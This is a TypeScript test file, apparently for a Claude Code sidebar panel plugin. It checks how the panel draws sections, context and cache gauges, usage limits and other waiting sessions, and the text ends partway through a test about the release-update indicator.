import { describe, expect, test } from "claude-code/testing";
import type { Engine } from "claude-code/testing";
import type { RenderNode } from "claude-code";

import {
  CWD,
  HOME,
  IN_ZELLIJ,
  MINUTE,
  PRESENCE,
  SESSION,
  SESSIONS,
  TAB_ID,
  START,
  boot,
  boxProps,
  briefWith,
  childrenOf,
  colorOf,
  colorsOf,
  compact,
  endSession,
  endTurn,
  measure,
  mountPanel,
  nameSession,
  otherSession,
  register,
  replyStep,
  reply,
  runCommand,
  runTurn,
  shown,
  spawnAgent,
  startTurn,
  storeSize,
  switchConversation,
  textOf,
} from "./harness";
import type { BriefFields, Harness } from "./harness";

const SECOND = 1000;
const HOUR = 60 * MINUTE;
const POLL = 10 * SECOND;
/** How often the sidecar asks claude agents which sessions are still running. */
const AGENTS_POLL = 30 * SECOND;
/** The panel's palette, from the Ghostty theme (GitHub Dark VS Code): calm gauges are blue, not green. */
const BLUE = "#4b91ff";
const YELLOW = "#f0d264";
const RED = "#e05561";
const GREEN = "#57cb66";
const TRACK = "#373e47";

const BRIEF: BriefFields = {
  title: "Fuse gauges with near-limit bars",
  story: "Combining the gauges layout with block bars and pace estimates.",
  now: { state: "waiting", text: "Clock time or countdown?" },
  step: "block bars switched",
  plan: [],
};

const TODOS = [
  {
    content: "Copy the mod",
    status: "completed",
    activeForm: "Copying the mod",
  },
  {
    content: "Write the failing tests",
    status: "in_progress",
    activeForm: "Writing the failing tests",
  },
  { content: "Implement", status: "pending", activeForm: "Implementing" },
] as const;

const pad = (n: number): string => String(n).padStart(2, "0");
const hhmm = (ms: number): string => {
  const at = new Date(ms);
  return `${pad(at.getHours())}:${pad(at.getMinutes())}`;
};
const dayTime = (ms: number): string =>
  `${
    ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"][new Date(ms).getDay()]
  } ${hhmm(ms)}`;

const edit = (path: string) =>
  ({
    tool: "Edit",
    file_path: path,
    old_string: "a",
    new_string: "b",
  } as const);

/** A first turn that leaves a brief behind. */
async function briefed(
  h: Harness,
  $: Engine,
  fields: BriefFields = BRIEF
): Promise<void> {
  await briefWith(h, $, fields, "fuse the sidebar");
}

/** The panel's text, one drawn row per line. */
/** The cells a row of the panel spans: its body less a column of room on each side. */
const inner = (columns: number): number => columns - 2;

const panelLines = async ($: Engine, columns = 44): Promise<string[]> =>
  (await shown(await mountPanel($, { bodyColumns: columns }))).split("\n");

/** The NEEDS YOU rows of a panel drawn now; the panel is unmounted after, so a test can draw again. */
async function needsRows($: Engine): Promise<string[]> {
  const panel = await mountPanel($, { bodyColumns: 44 });
  const lines = (await shown(panel)).split("\n");
  await panel.unmount();
  return section(lines, "NEEDS YOU");
}

const isBlank = (line: string | undefined): boolean =>
  line !== undefined && line.trim() === "";

/** The lines of one section: from its heading to the next blank line. */
function section(lines: string[], heading: string): string[] {
  const start = lines.findIndex((line) => line.startsWith(heading));
  if (start < 0) return [];
  const end = lines.findIndex((line, i) => i > start && isBlank(line));
  return lines.slice(start, end < 0 ? undefined : end);
}

const DOCK = 60;

/** The rows a dock `bodyRows` tall shows, by group; every Text is one row, the spacer none. */
async function dock($: Engine, bodyRows: number) {
  const panel = await mountPanel($, {
    bodyColumns: DOCK,
    scroll: { offset: 0, bodyRows },
  });
  const root = await panel.drawn();
  await panel.unmount();
  const [top, , bottom, footer] = childrenOf(root);
  const rows = (node: RenderNode | undefined) => {
    const text = textOf(node);
    return text === "" ? [] : text.split("\n");
  };
  const shown = {
    top: rows(top),
    bottom: rows(bottom),
    footer: rows(footer),
  };
  return { ...shown, all: [...shown.top, ...shown.bottom, ...shown.footer] };
}

describe("the sidebar's order", () => {
  test("puts the title first and every section in the approved order", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    h.git.changed["/home/dev/.dotfiles/app.rb"] = "12\t3";
    otherSession(h, {
      id: "other-1",
      name: "Bookshelf plans",
      state: "waiting",
      question: "Order the shelves?",
    });
    const turnId = await startTurn($, "go");
    await replyStep(h, $, turnId, {
      text: "Editing.",
      output: 880,
      ms: 10 * SECOND,
    });
    await $.tool.call({ tool: "TodoWrite", todos: TODOS } as never);
    await $.tool.call(edit("/home/dev/.dotfiles/app.rb"));
    await measure($, {
      tokens: 142_000,
      percent: 71,
      usd: 3.41,
      limits: [
        {
          kind: "five_hour",
          percentUsed: 31,
          resetsAt: h.clock.now() + 2 * HOUR,
        },
      ],
    });
    await h.clock.advance(POLL);

    const lines = await panelLines($);
    const at = (text: string) =>
      lines.findIndex((line) => line.startsWith(text));
    const order = [
      "Fuse gauges with near-limit bars",
      "◐ Working",
      "RECAP",
      "PLAN",
      "NOW",
      "CHANGED",
      "CONTEXT",
      "SPEED",
      "LIMITS",
      "NEEDS YOU",
      "~/.dotfiles:main",
    ].map(at);

    expect(lines[0]).toBe("Fuse gauges with near-limit bars");
    expect(order.every((i) => i >= 0)).toBe(true);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
  });
});

describe("the state line under the title", () => {
  test("counts the running turn's time to the second", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    await startTurn($, "go");
    await h.clock.advance(4 * MINUTE + 12 * SECOND);

    expect(await panelLines($)).toContain("◐ Working · 4m 12s");
  });

  test("says how long the session has waited on you", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    await h.clock.advance(2 * MINUTE);

    expect(await panelLines($)).toContain("◆ Waiting on you · 2m");
  });

  test("says how long the last turn took once it is done", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    const turnId = await startTurn($, "finish");
    await h.clock.advance(6 * MINUTE + 3 * SECOND);
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();

    expect(await panelLines($)).toContain("✓ Done · 6m 03s");
  });
});

describe("recap, plan and now", () => {
  test("recaps the story and the last two steps with their ages", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await h.clock.advance(8 * MINUTE);
    h.forkReplies.push(reply({ ...BRIEF, step: "session list in" }));
    await runCommand($, "brief", "refresh");
    await h.clock.settle();
    await h.clock.advance(6 * MINUTE);

    // The dock's real width: at 44 columns the steps line is cut at the edge, as the terminal always cut it.
    const recap = section(await panelLines($, 60), "RECAP");

    expect(recap.join(" ")).toContain(
      "Combining the gauges layout with block bars and pace estimates."
    );
    expect(recap).toContain("14m block bars switched · 6m session list in");
  });

  test("folds finished items into one line and counts the plan in its heading", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");

    await $.tool.call({ tool: "TodoWrite", todos: TODOS } as never);
    const plan = section(await panelLines($), "PLAN");

    expect(plan[0]?.endsWith("█░░ 1 / 3")).toBe(true);
    expect(plan).toContain("✓ 1 done: Copy the mod");
    expect(plan).toContain("◐ Write the failing tests");
    expect(plan).toContain("○ Implement");
  });

  test("says the plan came from the summary while there is no todo list", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $, {
      ...BRIEF,
      plan: [
        { text: "Switch to block bars", status: "done" },
        { text: "Estimate limits", status: "doing" },
      ],
    });

    const plan = section(await panelLines($), "PLAN");

    expect(plan[0]?.endsWith("from the summary")).toBe(true);
    expect(plan).toContain("✓ 1 done: Switch to block bars");
    expect(plan).toContain("◐ Estimate limits");
  });

  test("says what Claude asked and how long ago", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await h.clock.advance(3 * MINUTE);

    const now = section(await panelLines($), "NOW");

    expect(now).toContain("◆ Clock time or countdown?");
    expect(now).toContain("  asked 3m ago");
  });
});

describe("changed files", () => {
  test("totals the lines and draws a bar per file, newest first", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const counts: [string, string][] = [
      ["one.ts", "10\t0"],
      ["two.ts", "20\t2"],
      ["three.ts", "30\t4"],
      ["four.ts", "40\t6"],
      ["five.ts", "50\t0"],
      ["six.ts", "60\t0"],
      ["seven.ts", "32\t8"],
    ];
    for (const [name, count] of counts)
      h.git.changed[`/home/dev/.dotfiles/${name}`] = count;
    await startTurn($, "go");
    for (const [name] of counts)
      await $.tool.call(edit(`/home/dev/.dotfiles/${name}`));
    await h.clock.settle();

    const changed = section(await panelLines($), "CHANGED");

    expect(changed[0]?.endsWith("+242 −20 · 7 files")).toBe(true);
    expect(changed.slice(1).map((line) => line.split(" ")[0])).toEqual([
      "seven.ts",
      "six.ts",
      "five.ts",
      "four.ts",
      "three.ts",
      "two.ts",
      "one.ts",
    ]);
    expect(changed[1]?.endsWith(" +++++−")).toBe(true);
    expect(changed[2]?.endsWith("++++++++++")).toBe(true);
  });

  test("lists every file without a more line when four or fewer changed", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");

    for (const name of ["a.ts", "b.ts", "c.ts", "d.ts"])
      await $.tool.call(edit(`/home/dev/.dotfiles/${name}`));
    await h.clock.settle();
    const changed = section(await panelLines($), "CHANGED");

    expect(changed).toHaveLength(5);
    expect(changed.some((line) => line.includes("more files"))).toBe(false);
  });
});

describe("context", () => {
  test("shows the fill in bold, the tokens on the right and what it cost", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    await measure($, { tokens: 142_000, percent: 71, usd: 3.41 });
    const context = section(await panelLines($), "CONTEXT");

    expect(context[0]?.endsWith("$3.41 spent")).toBe(true);
    expect(context[1]).toMatch(/^71% +142k of 200k tokens$/);
    expect(context[1]).toHaveLength(inner(44));
  });

  test("draws the context bar across the whole panel", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    await measure($, { tokens: 142_000, percent: 71 });
    const context = section(await panelLines($, 51), "CONTEXT");

    expect(context[2]).toHaveLength(inner(51));
    expect(context[2]).toMatch(/^▀+$/);
  });

  test("estimates the turns of room from how much the last turns added", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    for (const tokens of [120_000, 130_000, 142_000])
      await measure($, { tokens, percent: Math.round(tokens / 2000) });

    expect(section(await panelLines($), "CONTEXT")).toContain(
      "about 5 turns of room"
    );
  });

  test("warns when auto-compact is a few turns away", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    for (const tokens of [148_000, 158_000, 168_000])
      await measure($, { tokens, percent: Math.round(tokens / 2000) });
    const panel = await mountPanel($);

    expect(section((await shown(panel)).split("\n"), "CONTEXT")).toContain(
      "nearly full · auto-compact in ~3 turns"
    );
    expect(colorOf(await panel.drawn(), "84%")).toBe(YELLOW);
  });

  test("warns when the next turn compacts", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    for (const tokens of [170_000, 180_000, 190_000])
      await measure($, { tokens, percent: Math.round(tokens / 2000) });
    const panel = await mountPanel($);

    expect(
      section((await shown(panel)).split("\n"), "CONTEXT").join(" ")
    ).toContain("auto-compact next turn · /compact now keeps the brief");
    expect(colorOf(await panel.drawn(), "95%")).toBe(RED);
  });

  test("says when the conversation was compacted", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await measure($, { tokens: 150_000, percent: 75 });

    await compact($);
    await h.clock.advance(3 * MINUTE);
    await measure($, { tokens: 44_000, percent: 22 });

    expect(section(await panelLines($), "CONTEXT").join(" ")).toContain(
      "compacted 3m ago · the brief and plan were kept"
    );
  });

  test("takes no rows before Claude Code has measured the session", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    expect(section(await panelLines($), "CONTEXT")).toHaveLength(0);
  });

  /** A reply of the main loop that read most of its prompt from the cache. */
  const cachedReply = (h: Harness, $: Engine, turnId: string) =>
    replyStep(h, $, turnId, {
      text: "Reading the gauges.",
      input: 2_000,
      cacheRead: 48_000,
      output: 300,
      ms: 2 * SECOND,
    });

  /** The CONTEXT section's cache row, if it has one. */
  const cacheRow = async ($: Engine): Promise<string | undefined> => {
    const panel = await mountPanel($);
    const lines = (await shown(panel)).split("\n");
    await panel.unmount();
    return section(lines, "CONTEXT").find((line) => line.startsWith("cache"));
  };

  test("shows the last reply's cache hit rate and when the cache goes cold: an hour on, for the main session", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const turnId = await startTurn($, "go");

    await cachedReply(h, $, turnId);
    await measure($, { tokens: 50_300, percent: 25 });
    await h.clock.advance(MINUTE);

    expect(await cacheRow($)).toBe("cache 96% hit · cold in ~59m");
  });

  test("learns the cache lasts an hour from a hit after a longer gap", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const turnId = await startTurn($, "go");
    await cachedReply(h, $, turnId);
    await measure($, { tokens: 50_300, percent: 25 });

    await h.clock.advance(20 * MINUTE);
    await cachedReply(h, $, turnId);
    await h.clock.advance(2 * MINUTE);

    expect(await cacheRow($)).toBe("cache 96% hit · cold in ~58m");
  });

  test("takes the cache's lifetime from a model switch", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await $.classic.PreModelSwitch({
      from_model: "claude-opus-5-5",
      to_model: "claude-sonnet-5-5",
      prompt_cache_warm: true,
      cache_ttl: "1h",
    } as never);
    const turnId = await startTurn($, "go");

    await cachedReply(h, $, turnId);
    await measure($, { tokens: 50_300, percent: 25 });
    await h.clock.advance(10 * MINUTE);

    expect(await cacheRow($)).toBe("cache 96% hit · cold in ~50m");
  });

  test("counts down from 5 minutes once a model switch says the cache lives that long", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await $.classic.PreModelSwitch({
      from_model: "claude-opus-5-5",
      to_model: "claude-sonnet-5-5",
      prompt_cache_warm: true,
      cache_ttl: "5m",
    } as never);
    const turnId = await startTurn($, "go");

    await cachedReply(h, $, turnId);
    await measure($, { tokens: 50_300, percent: 25 });
    await h.clock.advance(MINUTE);

    expect(await cacheRow($)).toBe("cache 96% hit · cold in ~4m");
  });

  test("says the cache went cold once its time is up", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const turnId = await startTurn($, "go");
    await cachedReply(h, $, turnId);
    await measure($, { tokens: 50_300, percent: 25 });

    await h.clock.advance(61 * MINUTE);

    expect(await cacheRow($)).toBe("cache cold · next turn rewrites it");
  });

  test("keeps the main loop's cache line when a subagent replies", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const turnId = await startTurn($, "go");
    await cachedReply(h, $, turnId);
    await measure($, { tokens: 50_300, percent: 25 });

    await replyStep(
      h,
      $,
      turnId,
      { text: "", input: 9_000, cacheWrite: 1_000, output: 50, ms: SECOND },
      "agent-1"
    );

    expect(await cacheRow($)).toMatch(/^cache 96% hit · /);
  });

  test("shows no cache line before the first reply", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    await measure($, { tokens: 10_000, percent: 5 });

    expect(await cacheRow($)).toBeUndefined();
  });
});

describe("speed", () => {
  test("shows the latest reply's tokens per second with the recent average and peak", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const turnId = await startTurn($, "go");

    await replyStep(h, $, turnId, {
      text: "First.",
      output: 600,
      ms: 10 * SECOND,
    });
    await replyStep(h, $, turnId, {
      text: "Second.",
      output: 880,
      ms: 10 * SECOND,
    });
    const speed = section(await panelLines($), "SPEED");

    expect(speed[0]?.endsWith("avg 74 · peak 88")).toBe(true);
    expect(speed[1]).toBe("88 t/s  ▁█");
  });

  test("leaves out short replies and subagents' replies", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const turnId = await startTurn($, "go");

    await replyStep(h, $, turnId, { text: "Ok.", output: 8, ms: SECOND });
    await replyStep(
      h,
      $,
      turnId,
      { text: "Searching.", output: 900, ms: 3 * SECOND },
      "agent-1"
    );

    expect(section(await panelLines($), "SPEED")).toHaveLength(0);
  });
});

describe("tokens", () => {
  test("has no section of their own, after replies of several models and agents", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const turnId = await startTurn($, "go");

    await replyStep(h, $, turnId, {
      text: "a",
      input: 1_300_000,
      output: 80_000,
    });
    await replyStep(h, $, turnId, {
      text: "b",
      model: "claude-haiku-5-5",
      input: 38_000,
      output: 1_000,
    });
    await replyStep(
      h,
      $,
      turnId,
      { text: "c", input: 100_000, output: 2_000 },
      "agent-1"
    );
    const lines = await panelLines($, 51);

    expect(lines.some((line) => line.startsWith("TOKENS"))).toBe(false);
    expect(lines.join("\n")).not.toContain("■ opus");
  });
});

describe("limits", () => {
  const fiveHour = (percentUsed: number, resetsAt: number) => ({
    kind: "five_hour",
    percentUsed,
    resetsAt,
  });

  test("draws each window's bar across the whole panel, its reset on the right edge", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const reset = h.clock.now() + 2 * HOUR;

    await measure($, {
      tokens: 10_000,
      percent: 5,
      limits: [fiveHour(31, reset)],
    });
    const limits = section(await panelLines($, 51), "LIMITS");

    expect(limits[1]).toBe(
      `5 hours  31%`.padEnd(inner(51) - `resets ${hhmm(reset)}`.length) +
        `resets ${hhmm(reset)}`
    );
    expect(limits[2]).toHaveLength(inner(51));
    expect(limits[2]).toMatch(/^▀+$/);
  });

  test("shows no note under any window: no forecast, no reset message", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const reset = h.clock.now() + 2 * HOUR;
    const week = h.clock.now() + 5 * 24 * HOUR;
    const windows = (hours: number, days: number) => [
      fiveHour(hours, reset),
      { kind: "seven_day", percentUsed: days, resetsAt: week },
    ];
    // A pace that would run both windows out before they reset.
    await measure($, { tokens: 10_000, percent: 5, limits: windows(52, 30) });
    await h.clock.advance(HOUR);

    await measure($, { tokens: 11_000, percent: 5, limits: windows(72, 36) });
    const limits = section(await panelLines($, 51), "LIMITS");

    expect(limits).toHaveLength(5);
    expect(limits[1]?.startsWith("5 hours  72%")).toBe(true);
    expect(limits[2]).toMatch(/^▀+$/);
    expect(limits[3]?.startsWith("Week  36%")).toBe(true);
    expect(limits[3]?.endsWith(`resets ${dayTime(week)}`)).toBe(true);
    expect(limits[4]).toMatch(/^▀+$/);
  });

  test("shows a reached window with its reset time and no note", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const reset = h.clock.now() + 94 * MINUTE;

    await measure($, {
      tokens: 10_000,
      percent: 5,
      limits: [fiveHour(100, reset)],
    });
    const limits = section(await panelLines($, 51), "LIMITS");

    expect(limits).toHaveLength(3);
    expect(limits[1]?.endsWith(`resets ${hhmm(reset)}`)).toBe(true);
  });

  test("colors each window's percent and bar by how full it is", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const reset = h.clock.now() + 3 * HOUR;
    const colorAt = async (percentUsed: number) => {
      await measure($, {
        tokens: 10_000,
        percent: 5,
        limits: [fiveHour(percentUsed, reset)],
      });
      const panel = await mountPanel($);
      const color = colorOf(await panel.drawn(), `${percentUsed}%`);
      const bars = colorsOf(await panel.drawn(), "▀");
      await panel.unmount();
      return { color, bars };
    };

    expect(await colorAt(31)).toMatchObject({ color: BLUE });
    expect((await colorAt(31)).bars).toContain(TRACK);
    expect((await colorAt(72)).color).toBe(YELLOW);
    expect((await colorAt(91)).color).toBe(RED);
  });

  test("takes no rows without subscription limits", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);

    await measure($, { tokens: 10_000, percent: 5 });

    expect(section(await panelLines($), "LIMITS")).toHaveLength(0);
  });
});

describe("sessions that need you", () => {
  test("lists only the other sessions waiting on input, oldest first, with how many are open", async ($, on) => {
    const h = await boot($, on);
    const now = h.clock.now();
    otherSession(h, {
      id: "a",
      name: "Nightly backup gap",
      state: "waiting",
      question: "Approve the backfill?",
      since: now - 6 * MINUTE,
      zellijSession: "other",
      cwd: "/home/dev/projects/acme/webshop",
    });
    otherSession(h, {
      id: "b",
      name: "Bookshelf plans",
      state: "waiting",
      question: "Order the shelves?",
      since: now - 18 * MINUTE,
      tabPosition: 1,
    });
    otherSession(h, { id: "c", name: "Newsletter sync", state: "working" });
    otherSession(h, { id: "d", name: "Invoice export", state: "done" });
    await briefed(h, $);

    await h.clock.advance(POLL);
    const lines = await panelLines($, 51);
    const needsYou = section(lines, "NEEDS YOU");

    expect(needsYou[0]?.endsWith("2 of 5 sessions")).toBe(true);
    expect(needsYou[1]).toMatch(/^◆ Bookshelf plans +tab 2 · 18m$/);
    expect(needsYou[2]).toBe("Order the shelves?");
    expect(needsYou[3]).toMatch(/^◆ Nightly backup gap +webshop · 6m$/);
    expect(needsYou[4]).toBe("Approve the backfill?");
    expect(lines.join("\n")).not.toContain("Newsletter sync");
    expect(lines.join("\n")).not.toContain("Invoice export");
  });

  test("drops sessions that ended or went quiet", async ($, on) => {
    const h = await boot($, on);
    const now = h.clock.now();
    otherSession(h, {
      id: "a",
      name: "Bookshelf plans",
      state: "waiting",
      question: "Order?",
    });
    otherSession(h, {
      id: "b",
      name: "Old one",
      state: "waiting",
      question: "Still there?",
      isEnded: true,
    });
    otherSession(h, {
      id: "c",
      name: "Quiet one",
      state: "waiting",
      question: "Hello?",
      updatedAt: now - 4 * MINUTE,
    });
    await briefed(h, $);

    await h.clock.advance(POLL);
    const needsYou = section(await panelLines($), "NEEDS YOU");

    expect(needsYou[0]?.endsWith("1 of 2 sessions")).toBe(true);
    expect(needsYou.join("\n")).not.toContain("Old one");
    expect(needsYou.join("\n")).not.toContain("Quiet one");
  });

  test("takes no rows while no other session needs you", async ($, on) => {
    const h = await boot($, on);
    otherSession(h, { id: "c", name: "Newsletter sync", state: "working" });
    await briefed(h, $);

    await h.clock.advance(POLL);

    expect(section(await panelLines($), "NEEDS YOU")).toHaveLength(0);
  });

  test("tells the other sessions when this one waits on you, and when it ends", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    const file = `${PRESENCE}/${SESSION}.json`;

    const waiting = JSON.parse(h.files[file] ?? "{}");
    expect(waiting).toMatchObject({
      name: "Fuse gauges with",
      state: "waiting",
      question: "Clock time or countdown?",
      tabPosition: 2,
      isEnded: false,
    });

    await endSession($);
    expect(JSON.parse(h.files[file] ?? "{}")).toMatchObject({ isEnded: true });
  });

  test("tells the other sessions about a question Claude is asking right now", async ($, on) => {
    const h = await boot($, on);
    await briefed(h, $);
    await startTurn($, "go");

    const asking = $.tool.call({
      tool: "AskUserQuestion",
      questions: [
        {
          question: "Countdown or clock?",
          header: "Reset",
          options: [],
          multiSelect: false,
        },
      ],
    } as never);
    await h.clock.advance(SECOND);

    expect(
      JSON.parse(h.files[`${PRESENCE}/${SESSION}.json`] ?? "{}")
    ).toMatchObject({ state: "waiting", question: "Countdown or clock?" });

    // The person answers, so no call is left open once the test ends.
    await h.clock.advance(MINUTE);
    await asking;
  });

  test("lists a session in a permission prompt, though it runs no sidecar", async ($, on) => {
    const h = await boot($, on);
    register(h, {
      pid: 6001,
      sessionId: "deploy",
      cwd: `${HOME}/projects/webshop`,
      name: "Deploy the webshop",
      status: "waiting",
      waitingFor: "permission prompt",
    });
    await h.clock.advance(4 * MINUTE);
    await briefed(h, $);

    await h.clock.advance(POLL);
    const needsYou = section(await panelLines($), "NEEDS YOU");

    expect(needsYou[0]?.endsWith("1 of 2 sessions")).toBe(true);
    expect(needsYou[1]).toMatch(/^◆ Deploy the webshop +webshop · 4m$/);
    expect(needsYou[2]).toBe("wants permission");
  });

  test("lists a session asking a question: its words where its sidecar says them, else that it asks", async ($, on) => {
    const h = await boot($, on);
    register(h, {
      pid: 6002,
      sessionId: "plain",
      cwd: `${HOME}/projects/bakery`,
      name: "Pick a colour scheme",
      status: "waiting",
      waitingFor: "input needed",
    });
    await h.clock.advance(MINUTE);
    otherSession(h, {
      id: "ours",
      name: "Bookshelf plans",
      state: "waiting",
      question: "Order the shelves?",
      waitingFor: "dialog open",
      tabPosition: 3,
    });
    await briefed(h, $);

    await h.clock.advance(POLL);
    const needsYou = section(await panelLines($), "NEEDS YOU");

    expect(needsYou[0]?.endsWith("2 of 3 sessions")).toBe(true);
    expect(needsYou[1]).toMatch(/^◆ Pick a colour scheme +bakery · 1m$/);
    expect(needsYou[2]).toBe("asks you something");
    expect(needsYou[3]).toMatch(/^◆ Bookshelf plans +tab 4 · 0m$/);
    expect(needsYou[4]).toBe("Order the shelves?");
  });

  test("shows no NEEDS YOU for a blocked background session alone", async ($, on) => {
    const h = await boot($, on);
    const now = h.clock.now();
    h.background.push(
      {
        id: "0fc1ee46",
        sessionId: "bg-1",
        cwd: `${HOME}/projects/bakery`,
        name: "Rotate the log files",
        startedAt: now - 20 * MINUTE,
        state: "blocked",
      },
      {
        id: "fc5b23ec",
        sessionId: "bg-2",
        cwd: `${HOME}/projects/bakery`,
        name: "Fix the date picker",
        startedAt: now - 5 * MINUTE,
        state: "running",
      }
    );
    await briefed(h, $);

    await h.clock.advance(AGENTS_POLL);
    const lines = await panelLines($, 60);

    expect(section(lines, "NEEDS YOU")).toEqual([]);
    expect(lines.join("\n")).not.toContain("Rotate the log files");
  });

  test("leaves a blocked background session out of NEEDS YOU beside a session that asks", async ($, on) => {
    const h = await boot($, on);
    h.background.push({
      id: "0fc1ee46",
      sessionId: "bg-1",
      cwd: `${HOME}/projects/bakery`,
      name: "Rotate the log files",
      startedAt: h.clock.now() - 20 * MINUTE,
      state: "blocked",
    });
    register(h, {
      pid: 6001,
      sessionId: "deploy",
      cwd: `${HOME}/projects/webshop`,
      name: "Deploy the webshop",
      status: "waiting",
      waitingFor: "permission prompt",
    });
    await briefed(h, $);

    await h.clock.advance(AGENTS_POLL);
    const needsYou = section(await panelLines($, 60), "NEEDS YOU");

    expect(needsYou[0]?.endsWith("1 of 3 sessions")).toBe(true);
    expect(needsYou[1]).toMatch(/^◆ Deploy the webshop +webshop · \d+m$/);
    expect(needsYou[2]).toBe("wants permission");
    expect(needsYou.join("\n")).not.toContain("Rotate the log files");
  });

  test("lists a session that finished while its tab was hidden after those waiting, until it is seen", async ($, on) => {
    const h = await boot($, on);
    const now = h.clock.now();
    otherSession(h, {
      id: "docs",
      name: "Docs pass",
      state: "done",
      said: "The docs are published",
      finishedAt: now - 2 * MINUTE,
      seenAt: now - 10 * MINUTE,
      tabPosition: 3,
    });
    otherSession(h, {
      id: "ask",
      name: "Bookshelf plans",
      state: "waiting",
      question: "Order the shelves?",
      since: now - MINUTE,
    });
    await briefed(h, $);

    await h.clock.advance(POLL);
    const needsYou = await needsRows($);

    expect(needsYou[0]?.endsWith("2 of 3 sessions")).toBe(true);
    expect(needsYou[1]).toMatch(/^◆ Bookshelf plans +tab 2 · 1m$/);
    expect(needsYou[3]).toMatch(/^◇ Docs pass +tab 4 · 2m$/);
    expect(needsYou[4]).toBe("finished: The docs are published");

    otherSession(h, {
      id: "docs",
      name: "Docs pass",
      state: "done",
      said: "The docs are published",
      finishedAt: now - 2 * MINUTE,
      seenAt: h.clock.now(),
      tabPosition: 3,
    });
    await h.clock.advance(POLL);
    expect((await needsRows($)).join("\n")).not.toContain("Docs pass");
  });

  test("tells the others it finished unseen until its zellij tab is on screen", async ($, on) => {
    const h = await boot($, on);
    nameSession(h, BRIEF.title);
    const file = `${PRESENCE}/${SESSION}.json`;

    const turnId = await startTurn($, "fuse the sidebar");
    await h.clock.advance(MINUTE);
    await endTurn($, turnId, { answer: "Fused the gauges. Done." });
    await h.clock.advance(POLL);
    const unseen = JSON.parse(h.files[file] ?? "{}");

    expect(unseen.finishedAt).toBeGreaterThan(unseen.seenAt);

    h.zellij.activeTabId = TAB_ID;
    await h.clock.advance(POLL);
    const seen = JSON.parse(h.files[file] ?? "{}");

    expect(seen.seenAt).toBeGreaterThanOrEqual(seen.finishedAt);
  });

  test("never tells the others it finished unseen outside zellij, where it can't tell", async ($, on) => {
    const h = await boot($, on, {}, {});
    nameSession(h, BRIEF.title);

    const turnId = await startTurn($, "fuse the sidebar");
    await h.clock.advance(MINUTE);
    await endTurn($, turnId, { answer: "Fused the gauges. Done." });
    await h.clock.advance(POLL);

    expect(
      JSON.parse(h.files[`${PRESENCE}/${SESSION}.json`] ?? "{}").finishedAt
    ).toBeNull();
  });

  test("drops a session claude agents no longer lists, and trusts the registry when claude agents fails", async ($, on) => {
    const h = await boot($, on);
    register(h, {
      pid: 6003,
      sessionId: "crashed",
      name: "Crashed while asking",
      status: "waiting",
      waitingFor: "permission prompt",
    });
    h.gone.add("crashed");
    await briefed(h, $);

    await h.clock.advance(AGENTS_POLL);
    expect(await needsRows($)).toHaveLength(0);

    h.isAgentsDown = true;
    await h.clock.advance(AGENTS_POLL);
    expect((await needsRows($)).join("\n")).toContain("Crashed while asking");
  });

  test("reads only the registry's <pid>.json entries, and skips a malformed one", async ($, on) => {
    const h = await boot($, on);
    h.files[`${SESSIONS}/6004.token`] = "a secret beside the entries";
    h.files[`${SESSIONS}/6005.json`] = '{"pid": 6005, "sessionId":';
    register(h, {
      pid: 6006,
      sessionId: "asking",
      name: "Pick a colour scheme",
      status: "waiting",
      waitingFor: "input needed",
    });
    await briefed(h, $);

    await h.clock.advance(POLL);
    const needsYou = section(await panelLines($), "NEEDS YOU");

    expect(needsYou.join("\n")).toContain("Pick a colour scheme");
    expect(h.reads).not.toContain(`${SESSIONS}/6004.token`);
  });
});

describe("the dot before Claude Code", () => {
  const dot = async ($: Engine) =>
    colorOf(await (await mountPanel($)).drawn(), "●");

  test("is green while this is the latest release", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.300");
    await h.clock.settle();

    expect(await dot($)).toBe(GREEN);
  });

  test("is yellow while a newer release is out and not installed", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.310");
    await h.clock.settle();

    expect(await dot($)).toBe(YELLOW);
  });

  /** A turn ends, so the footer knows the model and its effort, as a real session's first reply tells it. */
  async function replied(h: Harness, $: Engine) {
    const turnId = await startTurn($, "go");
    await replyStep(h, $, turnId, {
      text: "Working.",
      output: 100,
      ms: SECOND,
    });
    await endTurn($, turnId, { answer: "Done." });
    await h.clock.settle();
  }

  test("is the only sign of an update: the engine line names no update", async ($, on) => {
    const h = await boot($, on, {}, IN_ZELLIJ, "2.1.310");
    await replied(h, $);
